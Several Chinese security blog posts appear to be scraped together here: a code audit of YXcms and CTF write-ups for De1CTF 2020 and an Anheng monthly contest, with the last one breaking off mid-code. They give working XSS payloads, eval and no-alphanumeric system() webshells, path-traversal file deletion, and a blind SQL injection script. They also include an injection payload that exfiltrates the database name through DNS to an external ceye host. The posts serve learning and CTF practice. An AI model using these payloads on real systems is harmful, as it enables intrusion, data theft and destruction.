&#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;onfocusout&#39;, &#39;onhelp&#39;, &#39;onkeydown&#39;, &#39;onkeypress&#39;, &#39;onkeyup&#39;, &#39;onlayoutcomplete&#39;, &#39;onload&#39;, &#39;onlosecapture&#39;, &#39;onmousedown&#39;, &#39;onmouseenter&#39;, &#39;onmouseleave&#39;, &#39;onmousemove&#39;, &#39;onmouseout&#39;, &#39;onmouseover&#39;, &#39;onmouseup&#39;, &#39;onmousewheel&#39;, &#39;onmove&#39;, &#39;onmoveend&#39;, &#39;onmovestart&#39;, &#39;onpaste&#39;, &#39;onpropertychange&#39;, &#39;onreadystatechange&#39;, &#39;onreset&#39;, &#39;onresize&#39;, &#39;onresizeend&#39;, &#39;onresizestart&#39;, &#39;onrowenter&#39;, &#39;onrowexit&#39;, &#39;onrowsdelete&#39;, &#39;onrowsinserted&#39;, &#39;onscroll&#39;, &#39;onselect&#39;, &#39;onselectionchange&#39;, &#39;onselectstart&#39;, &#39;onstart&#39;, &#39;onstop&#39;, &#39;onsubmit&#39;, &#39;onunload&#39;); $ra = array_merge($ra1, $ra2); $found = true; // keep replacing as long as the previous round replaced something while ($found == true) { $val_before = $val; for ($i = 0; $i &lt; sizeof($ra); $i++) { $pattern = &#39;/&#39;; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) { if ($j &gt; 0) { $pattern .= &#39;(&#39;; $pattern .= &#39;(&amp;#[xX]0{0,8}([9ab]);)&#39;; $pattern .= &#39;|&#39;; $pattern .= &#39;|(&amp;#0{0,8}([9|10|13]);)&#39;; $pattern .= &#39;)*&#39;; } $pattern .= $ra[$i][$j]; } $pattern .= &#39;/i&#39;; $replacement = substr($ra[$i], 0, 2).&#39;&lt;x&gt;&#39;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags if ($val_before == $val) { // no replacements were made, so exit the loop $found = false; } } } return $val; } 测试了一下，发现前端输入&lt;svg/onload=alert(1)&gt;在数据库中会被存储为&amp;lt;svg/on&amp;lt;x&amp;gt;load=alert(1)&amp;gt; 我们在来看看后端的代码：后台的文件源码protected/apps/admin/controller/extendfieldController.php public function mesedit() { $tableid=intval($_GET[&#39;tabid&#39;]); if(!$this-&gt;checkConPower(&#39;extend&#39;,$tableid)) $this-&gt;error(&#39;您没有权限管理此独立表内容~&#39;); $id=intval($_GET[&#39;id&#39;]);//信息id if(empty($tableid) || empty($id) ) $this-&gt;error(&#39;参数错误~&#39;); $tableinfo = model(&#39;extend&#39;)-&gt;select(&quot;id=&#39;{$tableid}&#39; OR pid=&#39;{$tableid}&#39;&quot;,&#39;id,tableinfo,name,type,defvalue&#39;,&#39;pid,norder DESC&#39;); if(empty($tableinfo)) $this-&gt;error(&#39;自定义表不存在~&#39;); if (!$this-&gt;isPost()) { $info=model(&#39;extend&#39;)-&gt;Extfind($tableinfo[0][&#39;tableinfo&#39;],&quot;id=&#39;{$id}&#39;&quot;); // var_dump($info); // exit(); $this-&gt;info=$info; $this-&gt;tableid=$tableid; $this-&gt;id=$id; $this-&gt;tableinfo=$tableinfo; $this-&gt;display(); }else{ for($i=1;$i&lt;count($tableinfo);$i++){ if(is_array($_POST[$tableinfo[$i][&#39;tableinfo&#39;]])) $data[$tableinfo[$i][&#39;tableinfo&#39;]]=implode(&#39;,&#39;,$_POST[$tableinfo[$i][&#39;tableinfo&#39;]]); else $data[$tableinfo[$i][&#39;tableinfo&#39;]]=html_in($_POST[$tableinfo[$i][&#39;tableinfo&#39;]]); } if(model(&#39;extend&#39;)-&gt;Extup($tableinfo[0][&#39;tableinfo&#39;],&quot;id=&#39;{$id}&#39;&quot;,$data)) $this-&gt;success(&#39;修改成功~&#39;,url(&#39;extendfield/meslist&#39;,array(&#39;id&#39;=&gt;$tableid))); else $this-&gt;error(&#39;信息修改失败~&#39;); } } 直接从数据库中取值，然后就是正常的给页面返回值了： 实现代码：/protected/apps/admin/view/extendfield_mesedit.php $cont.=&#39;&#39;; for($i=1;$i&lt;count($tableinfo);$i++){ $cont.= &#39;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&#39;.$tableinfo[$i][&#39;name&#39;].&#39;：&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&#39;; switch ($tableinfo[$i][&#39;type&#39;]) { case 1: $cont.= &#39;&lt;input type=&quot;text&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; value=&quot;&#39;.$info[$tableinfo[$i][&#39;tableinfo&#39;]].&#39;&quot;&gt;&#39;; break; case 2: $cont.= &#39;&lt;textarea name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; style=&quot;width:300px !important; height:80px&quot;&gt;&#39;.$info[$tableinfo[$i][&#39;tableinfo&#39;]].&#39;&lt;/textarea&gt;&#39;; break; case 3: $cont.= &#39;&lt;textarea class=&quot;editori&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; style=&quot;width:100%;height:250px;visibility:hidden;&quot;&gt;&#39;.html_out($info[$tableinfo[$i][&#39;tableinfo&#39;]]).&#39;&lt;/textarea&gt;&#39;; break; case 4: $cont.= &#39;&lt;select name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; &gt;&#39;; $chooses=explode(&quot;\\r\\n&quot;,$tableinfo[$i][&#39;defvalue&#39;]); $flog=false; foreach ($chooses as $vo) { $vos=explode(&quot;,&quot;,$vo); if($info[$tableinfo[$i][&#39;tableinfo&#39;]]==$vos[0]) { $flog=true; $cont.=&#39;&lt;option selected value=&quot;&#39;.$vos[0].&#39;&quot;&gt;&#39;.$vos[1].&#39;&lt;/option&gt;&#39;; }else{ $cont.=&#39;&lt;option value=&quot;&#39;.$vos[0].&#39;&quot;&gt;&#39;.$vos[1].&#39;&lt;/option&gt;&#39;; } } if(!$flog) $cont.=&#39;&lt;option selected value=&quot;&quot;&gt;=没有选择=&lt;/option&gt;&#39;; $cont.= &#39;&lt;/select&gt;&#39;; break; case 5: $cont.= &#39;&lt;input name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; id=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; type=&quot;text&quot; value=&quot;&#39;.$info[$tableinfo[$i][&#39;tableinfo&#39;]].&#39;&quot; /&gt;&#39;; $cont.= &#39;&lt;iframe scrolling=&quot;no&quot;; frameborder=&quot;0&quot; src=&quot;&#39;.url(&quot;extendfield/file&quot;,array(&#39;inputName&#39;=&gt;$tableinfo[$i][&#39;tableinfo&#39;])).&#39;&quot; style=&quot;width:300px; height:30px;&quot;&gt;&lt;/iframe&gt;&#39;; break; case 6: $chooses=explode(&quot;\\r\\n&quot;,$tableinfo[$i][&#39;defvalue&#39;]); foreach ($chooses as $vo) { $vos=explode(&quot;,&quot;,$vo); $nowval=array(); $nowval=explode(&quot;,&quot;,$info[$tableinfo[$i][&#39;tableinfo&#39;]]); $cont.= (in_array($vos[0],$nowval))?$vos[1].&#39;&lt;input checked type=&quot;checkbox&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;[]&quot; value=&quot;&#39;.$vos[0].&#39;&quot; /&gt;&#39;:$vos[1].&#39;&lt;input type=&quot;checkbox&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;[]&quot; value=&quot;&#39;.$vos[0].&#39;&quot; /&gt;&lt;br&gt;&#39;; } break; } $cont.= &#39;&lt;/td&gt;&lt;/tr&gt;&#39;; } echo $cont; 只有case3 使用了html_out函数， 这个html_out函数操作就很骚。。。在html代码输出利用htmlspecialchars_decode将特殊的 HTML 实体转换回普通字符。。那么上面的被实体化的又被转换了回来。。。就可能会有XSS漏洞。。。 /protected/include/lib/common.function.php //html代码输出 function html_out($str){ if(function_exists(&#39;htmlspecialchars_decode&#39;)) $str=htmlspecialchars_decode($str); else $str=html_entity_decode($str); $str = stripslashes($str); return $str; } 别的参数，都被html实体化了为：&amp;lt;svg/on&amp;lt;x&amp;gt;load=alert(2)&amp;gt; ，只有留言内容用了html_out函数，被转换了回来。。被转换为了&lt;svg/on&lt;x&gt;load=alert(4)&gt; 但是存在&lt;x&gt;测试了一下竟然成功xss：是因为这个富文本编译器的原因导致的xss导致了&lt;x&gt;被吞，只剩下&lt;svg/onload=alert(4)&gt;执行了xss代码。(这里有点不是很清晰，找文章也没找到一个合理的解释，如果有大佬知道原理，请告诉我一下) 可以利用这个漏洞来获取管理员的cookie，进入后台。。。 任意文件写入(getshell)漏洞复现进入网站后台。/index.php?r=admin/set/tpadd&amp;Mname=default新建模板文件：可以创建任意的文件。。通过目录结构，可以找到新的模板文件的位置/protected/apps/default/view/default/phpinfo.php 可以看到是我们写入的文件被执行了，所有可以写入一句话木马，来进行getshell。。 代码分析代码位置protected/apps/admin/controller/setController.php： public function tpadd() { $tpfile=$_GET[&#39;Mname&#39;]; if(empty($tpfile)) $this-&gt;error(&#39;非法操作~&#39;); $templepath=BASE_PATH . $this-&gt;tpath.$tpfile.&#39;/&#39;; if($this-&gt;isPost()){ $filename=trim($_POST[&#39;filename&#39;]); $code=stripcslashes($_POST[&#39;code&#39;]); if(empty($filename)||empty($code)) $this-&gt;error(&#39;文件名和内容不能为空&#39;); $filepath=$templepath.$filename.&#39;.php&#39;; if($this-&gt;ifillegal($filepath)) {$this-&gt;error(&#39;非法的文件路径~&#39;);exit;} try{ file_put_contents($filepath, $code); } catch(Exception $e) { $this-&gt;error(&#39;模板文件创建失败！&#39;); } $this-&gt;success(&#39;模板文件创建成功！&#39;,url(&#39;set/tplist&#39;,array(&#39;Mname&#39;=&gt;$tpfile))); }else{ $this-&gt;tpfile=$tpfile; $this-&gt;display(); } } 这里$_GET[&#39;Mname&#39;]是新增模板文件的模板名字。。如果没有就会error(&#39;非法操作~&#39;);新增模板的文件名和文件内容 是通过post进行传输的。 这里的文件保存路径就是$templepath=protected/apps/default/view/default/ 然后对文件名和文件内容进行了非空验证if(empty($filename)||empty($code)) $this-&gt;error(&#39;文件名和内容不能为空&#39;); 别的没有验证。。。 验证了一下文件的路径：if($this-&gt;ifillegal($filepath)) {$this-&gt;error(&#39;非法的文件路径~&#39;);exit;}追踪这个函数ifillegal:代码位置/protected/apps/admin/controller/setController.php protected function ifillegal($path) { if(strstr($path,&quot;./&quot;)||strstr($path,&quot;.\\\\&quot;)||!strstr($path,&quot;/view/&quot;)) return true; else return false; } 也没有什么问题，然后就可以创建模板文件了。。 看完代码发现对文件内容没有任何的要求，直接getshell,这种管理员直接可以创建可执行文件的行为是很危险的。。。 任意文件删除(一)漏洞复现这个漏洞还是在后台。。。看到了这里有一个删除的按钮 点击删除，进行抓包： 通过控制fname参数可以实现任意文件删除的功能。。 代码分析代码位置protected/apps/admin/controller/filesController.php： public function del() { $dirs=in($_GET[&#39;fname&#39;]); $dirs=str_replace(&#39;,&#39;,&#39;/&#39;,$dirs); $dirs=ROOT_PATH.&#39;upload&#39;.$dirs; if(is_dir($dirs)){del_dir($dirs); echo 1;} elseif(file_exists($dirs)){ if(unlink($dirs)) echo 1; }else echo &#39;文件不存在&#39;; } 对fname进行替换操作str_replace(&#39;,&#39;,&#39;/&#39;,$dirs);讲参数最前面的分号(%2C)替换为/ 然后完整的拼接路径，看文件是否存在，存在就进行删除。。。这里没有读传入的参数进行过滤，可以及逆行上跳目录，从而达到任意文件删除的效果。。。 任意文件删除(二)漏洞复现漏洞位置一如既往的还在后台： 在对文章编辑的页面上，发现存在删除已上传的图片的功能。。 设置抓包，点击删除： 虽然显示的是缩略图不存在，但是通过查看发现已经删除了123.txt这个文件 也是存在任意文件删除 代码分析代码位置/protected/apps/admin/controller/photoController.php public function delpic() { if(empty($_POST[&#39;picname&#39;])) $this-&gt;error(&#39;参数错误~&#39;); $picname=$_POST[&#39;picname&#39;]; $path=$this-&gt;uploadpath; if(file_exists($path.$picname)) @unlink($path.$picname); else{echo &#39;图片不存在~&#39;;return;} if(file_exists($path.&#39;thumb_&#39;.$picname)) @unlink($path.&#39;thumb_&#39;.$picname); else {echo &#39;缩略图不存在~&#39;;return;} echo &#39;原图以及缩略图删除成功~&#39;; } 这个代码和上面的那个任意文件删除，差不多，都是对参数的过滤不严谨，导致可以上跳目录，删除任意文件。。。 SQL注入漏洞复现url:/index.php?r=admin/fragment/index 利用ceye得到的回显。。。用bp抓包，修改id为 payload:2 and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.36rdia.ceye.io\\\\abc&#39;))),2,2) 在ceye上面可以得到回显： 得到了数据库名称yxcms 代码分析代码位置protected/apps/admin/controller/fragmentController.php public function del() { if(!$this-&gt;isPost()){ $id=intval($_GET[&#39;id&#39;]); if(empty($id)) $this-&gt;error(&#39;您没有选择~&#39;); if(model(&#39;fragment&#39;)-&gt;delete(&quot;id=&#39;$id&#39;&quot;)) echo 1; else echo &#39;删除失败~&#39;; }else{ if(empty($_POST[&#39;delid&#39;])) $this-&gt;error(&#39;您没有选择~&#39;); $delid=implode(&#39;,&#39;,$_POST[&#39;delid&#39;]); if(model(&#39;fragment&#39;)-&gt;delete(&#39;id in (&#39;.$delid.&#39;)&#39;)) $this-&gt;success(&#39;删除成功&#39;,url(&#39;fragment/index&#39;)); } } 主要就是这一句话if(model(&#39;fragment&#39;)-&gt;delete(&#39;id in (&#39;.$delid.&#39;)&#39;)) 追踪一下这个delete函数 先找一下这个fragmentModel代码位置：protected/apps/admin/model/fragmentModel.php &lt;?php class fragmentModel extends baseModel{ protected $table = &#39;fragment&#39;; } 发现没有任何东西，去这个baseModel里面找一下 代码位置：protected/base/model/baseModel.php &lt;?php class baseModel extends model{ protected $prefix=&#39;&#39;; public function __construct( $database= &#39;DB&#39;,$force = false ){ parent::__construct(); $this-&gt;prefix=config(&#39;DB_PREFIX&#39;); } } 看一下这个model 代码位置：protected/base/model/model.php public function delete($condition){ return $this-&gt;model-&gt;table($this-&gt;table, $this-&gt;ignoreTablePrefix)-&gt;where($condition)-&gt;delete(); } 这里又有一个delete()，这个应该还要找一下： 位置：protected/include/core/cpModel.class.php, public function delete() { $table = $this-&gt;options[&#39;table&#39;]; //当前表 $where = $this-&gt;_parseCondition(); //条件 if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除 $this-&gt;sql = &quot;DELETE FROM $table $where&quot;; $query = $this-&gt;db-&gt;execute($this-&gt;sql); return $this-&gt;db-&gt;affectedRows(); } 这里也是为sql语句赋值，然后拼接sql语句的作用。。 获取一下sql语句为DELETE FROM yx_fragment WHERE id in (3)。。。 需要关注这个代码：$where = $this-&gt;_parseCondition(); //条件 代码位置：protected/include/core/cpModel.class.php private function _parseCondition() { $condition = $this-&gt;db-&gt;parseCondition($this-&gt;options); $this-&gt;options[&#39;where&#39;] = &#39;&#39;; $this-&gt;options[&#39;group&#39;] = &#39;&#39;; $this-&gt;options[&#39;having&#39;] = &#39;&#39;; $this-&gt;options[&#39;order&#39;] = &#39;&#39;; $this-&gt;options[&#39;limit&#39;] = &#39;&#39;; $this-&gt;options[&#39;field&#39;] = &#39;*&#39;; return $condition; } 这里$condition = $this-&gt;db-&gt;parseCondition($this-&gt;options); 看一下parseCondition这个函数： 位置protected/include/core/db/cpMysql.class.php public function parseCondition($options) { $condition = &quot;&quot;; if(!empty($options[&#39;where&#39;])) { $condition = &quot; WHERE &quot;; if(is_string($options[&#39;where&#39;])) { $condition .= $options[&#39;where&#39;]; } else if(is_array($options[&#39;where&#39;])) { foreach($options[&#39;where&#39;] as $key =&gt; $value) { $condition .= &quot; `$key` = &quot; . $this-&gt;escape($value) . &quot; AND &quot;; } $condition = substr($condition, 0,-4); } else { $condition = &quot;&quot;; } } if( !empty($options[&#39;group&#39;]) &amp;&amp; is_string($options[&#39;group&#39;]) ) { $condition .= &quot; GROUP BY &quot; . $options[&#39;group&#39;]; } if( !empty($options[&#39;having&#39;]) &amp;&amp; is_string($options[&#39;having&#39;]) ) { $condition .= &quot; HAVING &quot; . $options[&#39;having&#39;]; } if( !empty($options[&#39;order&#39;]) &amp;&amp; is_string($options[&#39;order&#39;]) ) { $condition .= &quot; ORDER BY &quot; . $options[&#39;order&#39;]; } if( !empty($options[&#39;limit&#39;]) &amp;&amp; (is_string($options[&#39;limit&#39;]) || is_numeric($options[&#39;limit&#39;])) ) { $condition .= &quot; LIMIT &quot; . $options[&#39;limit&#39;]; } if( empty($condition) ) return &quot;&quot;; return $condition; } 大部分代码都是为变量赋值的，里面有一句代码escape($value) 应该是一个过滤函数 查看一下这个函数escape //数据过滤 public function escape($value) { if( isset($this-&gt;_readLink) ) { $link = $this-&gt;_readLink; } elseif( isset($this-&gt;_writeLink) ) { $link = $this-&gt;_writeLink; } else { $link = $this-&gt;_getReadLink(); } if( is_array($value) ) { return array_map(array($this, &#39;escape&#39;), $value); } else { if( get_magic_quotes_gpc() ) { $value = stripslashes($value); } return &quot;&#39;&quot; . mysql_real_escape_string($value, $link) . &quot;&#39;&quot;; } } 发现只有当我们传入的值为数组的时候，会对数组中的每个参数进行mysql_real_escape_string()函数进行处理。 sql语句为DELETE FROM yx_fragment WHERE id in ($id) 由于注入语句并没有单引号包裹，所以说可以直接进行注入， 但是没有页面的回显，可以利用ceye平台进行注入，在那里可以看到注入的回显。进行sql注入。 总结第一次审计一个cms，虽然这是一个入门级的cms，比较简单，但是也从中学到了点知识。。。 审计代码要有耐心。。。找函数的时候直接用Seay源码审计系统中的全局搜索比较方便，自己乱找的话，心态会崩。。。 参考https://www.secshi.com/18986.htmlceyehttps://xz.aliyun.com/t/2734#toc-0","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"}]},{"title":"De1CTF2020部分writeup","slug":"De1CTF2020部分writeup","date":"2020-05-03T23:43:41.000Z","updated":"2020-05-04T05:24:45.116Z","comments":true,"path":"2020/05/04/De1CTF2020部分writeup/","link":"","permalink":"http://yoursite.com/2020/05/04/De1CTF2020部分writeup/","excerpt":"","text":"前言XCTF分站赛的第一站De1CTF开始了。。。。这次web题目质量很好 可是太菜了，没做出来多少 webcheck in打开链接发现是一个文件上传的题目 测试发现这里对文件的后罪名有限制，可以修改Content-Type:参数进行绕过，但是上传php文件不行。。。 对文件内容也有限制。。 perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents! 过滤了一些关键的字符。。看到这里猜测考点是利用.htaccess getshell 正常的一个.htaccess的内容为： SetHandler application/x-httpd-php 但是因为文本中有ph字符，需要想办法进行绕过，在测试发现： SetHandler application/x-httpd-p\\ hp 换行进行绕过是可以的。。 然后上传图片马，访问即可。。 由于过滤了ph,&gt;等字符，，所以图片马的内容为： &lt;?=@eval($_POST[aa]); 用蚁剑进行链接： 在根目录找到了flag… Hard_Pentest_1打开题目发现给出了源码 &lt;?php //Clear the uploads directory every hour highlight_file(__FILE__); $sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]); @mkdir($sandbox); @chdir($sandbox); if($_POST[&quot;submit&quot;]){ if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){ if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){ die($_FILES[&quot;file&quot;][&quot;error&quot;]); } else{ $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename); echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename; } } else{ echo &quot;Not Allow!&quot;; } } function Check(){ $BlackExts = array(&quot;php&quot;); $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]); $exts = trim(end($ext)); $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match(&#39;/\\.\\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) { return true; } return false; } ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;upload&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 主要看一下这个check() function Check(){ $BlackExts = array(&quot;php&quot;); $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]); $exts = trim(end($ext)); $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match(&#39;/\\.\\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) { return true; } return false; } 限制了后缀名，不能为php，我们可以大小写进行绕过 最重要的是对文件内容进行了过滤。。。 preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content) 不能出现字母数字和一些特殊字符。。想到了无字母数字getshell的点，因为过滤了~^,就不能用取反和异或来进行getshell。想到的方法是递增。。。但是递增需要分号，需要绕过分号，来进行getshell… 测试发现可以利用&lt;?=?&gt;来进行绕过 &lt;?=$_=[]?&gt; &lt;?=$_=&quot;$_&quot;?&gt; &lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt; 刚开始传的是assert的木马，发现怎么也执行不了命令，忽然看到php版本为PHP/7.2.29 那就打扰了 后来改变目标传一个system的，发现可以成功。。。 递增的代码 相当于system($_POST[_]);： &lt;?=$_=[]?&gt; &lt;?=$_=&quot;$_&quot;?&gt; &lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt; &lt;?=$___=$_?&gt; &lt;?=$__=$_?&gt; &lt;?=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$____=$__++?&gt; &lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____________=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$__________=$__++?&gt; &lt;?=$_________=$__++?&gt; &lt;?=$__++?&gt; &lt;?=$________=$__++?&gt; &lt;?=$_____=$__++?&gt; &lt;?=$______=$__++?&gt; &lt;?=$______?&gt; &lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$____________=$__++?&gt; &lt;?=$_____.$____________.$_____.$______.$____.$_____________?&gt; &lt;?=$________________=$_____.$____________.$_____.$______.$____.$_____________?&gt; &lt;?=$_________.$__________.$_____.$______?&gt; &lt;?=($________________)(${&#39;_&#39;.$_________.$__________.$_____.$______}[_])?&gt; 可以执行系统命令。。。 上传文件，打到msf上： 发现了一些信息，存在Hint 查看目录文件发现了压缩包 ： 将其下载下来，发现需要密码。。 查看了一下用户，发现了一个很奇怪的用户名。。看一下这个用户的信息：发现也没有什么有用的信息。。 然后有师傅说会不会HintZip_Pass用户的密码就是压缩包的密码。。。 由于对域渗透了解有限。。没有什么好的方法来得到用户密码。。 找到了这样的一篇文章[参考文章]利用msf的gpp模块 成功获取到了用户的密码：(https://blog.csdn.net/qq_36119192/article/details/104344105) 也有提示这就是压缩包的密码zL1PpP@sSwO3d解压得到flag.. mixture打开发现是个登陆页面： 随便输入就可以进去 很神奇aa:aa进入之后发现只能够查看用户信息 admin.php和select.php都需要admin权限查看源码发现有提示orderby：猜测是一个注入。。测试发现http://134.175.185.244/member.php?orderby=|1=2和http://134.175.185.244/member.php?orderby=|1=1回显不同，找到了注入点。。。。发现过滤了一些东西： if desc sleep updatexml ^ union &amp;&amp; regexp exp extractvalue length hex 可以进行布尔盲注。。写个脚本开始跑。。 import requests import re url=&quot;http://134.175.185.244/member.php?orderby=&quot; cookies={&#39;PHPSESSID&#39;:&#39;s0d02a5rb52ejonbml114f8pen&#39;} flag=&#39;&#39; for i in range(1,33): print i for j in range(37,127): # payload=&quot;|1=(ascii(mid((database()),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot; # payload=&quot;|1=(ascii(mid(((SELECT group_concat(table_name) from information_schema.tables where table_schema=database())),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot; # payload=&quot;|1=(ascii(mid(((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;member&#39;)),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot; payload=&quot;|1=(ascii(mid(((select password from member where username=&#39;admin&#39;)),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot; url_1=url+payload res=requests.get(url_1,cookies=cookies) a = re.search(r&#39;&lt;td&gt;(.*)&lt;/td&gt;&#39;, res.text, re.M | re.S).group(1)[:1] if int(a)==2: flag+=chr(j) print flag break else: pass # database test # member,users # member: id,username,password # password: 18a960a3a0b3554b314ebe77fe545c85 得到了密码的md5值，在网站进行解密得到密码。。 用admin:goodlucktoyou进行登陆： 发现select.php可以读源码。。。发现存在/readflag 说明需要执行命令来得到flag… admin页面是一个phpinfo()页面。。 发现了一个神奇的东西Minclude select.php的内容为： &lt;?php include &quot;profile.php&quot;; $search = $_POST[&#39;search&#39;]; if($_SESSION[&#39;admin&#39;]==1){ print &lt;&lt;&lt;EOT &lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt; &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt; &lt;/div&gt; &lt;/form&gt; EOT; } else{ print &lt;&lt;&lt;EOT &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot; &gt; &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt; &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt; &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt; &lt;/span&gt; &lt;/div&gt;&lt;!-- /input-group --&gt; &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt; &lt;/div&gt; &lt;/div&gt; EOT; } if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){ //var_dump(urldecode($search)); Minclude(urldecode($search)); //lookup($search); } 这里利用了Minclude(urldecode($search)); 漏洞点应该就在这里了，，， 然后就是自闭了 没找到解决的方法。。。我太菜了。。。 MiscWelcome_to_the_2020_de1ctf是一个加群链接 科学上网得到flag Misc杂烩是一个流量包：发现里面有一张png图片，将其分离出来，找到了一个链接： https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view 下载下来，得到了一个readme.zip得到了一个docx文件发现没什么东西 分离一下docx文件得到了You_found_me_Orz.zip 根据赛题的提示 In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are &quot;D&quot; and &quot;E&quot;. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。 进行爆破 得到压缩包密码：DE34Q1得到了一个图片。binwalk分离一下： 发现有一个压缩包，里面又文件666.jpg:fffffffflllll.txt 为flagDe1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb} Questionnaire问卷调查，直接给flag 总结这次比赛质量真的好，题目很好，也很新颖，接触了一些域渗透的东西，，感觉有不错的收获。。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"安恒四月赛部分writeup","slug":"安恒四月赛部分writeup","date":"2020-04-25T14:59:30.000Z","updated":"2020-04-26T03:28:59.799Z","comments":true,"path":"2020/04/25/安恒四月赛部分writeup/","link":"","permalink":"http://yoursite.com/2020/04/25/安恒四月赛部分writeup/","excerpt":"","text":"前言这周有安恒的月赛，又是膜师傅的一天学到了一些骚姿势： webweb1打开题目发现给出了源码： &lt;?php show_source(&quot;index.php&quot;); function write($data) { return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\\0\\0\\0&#39;, $data); } function read($data) { return str_replace(&#39;\\0\\0\\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data); } class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; } } class B{ public $b = &#39;gqy&#39;; function __destruct(){ $c = &#39;a&#39;.$this-&gt;b; echo $c; } } class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return &#39;nice&#39;; } } $a = @new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]); //省略了存储序列化数据的过程,下面是取出来并反序列化的操作 $b = unserialize(read(write(serialize($a)))); 我们来分析一下： function write($data) { return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\\0\\0\\0&#39;, $data); } function read($data) { return 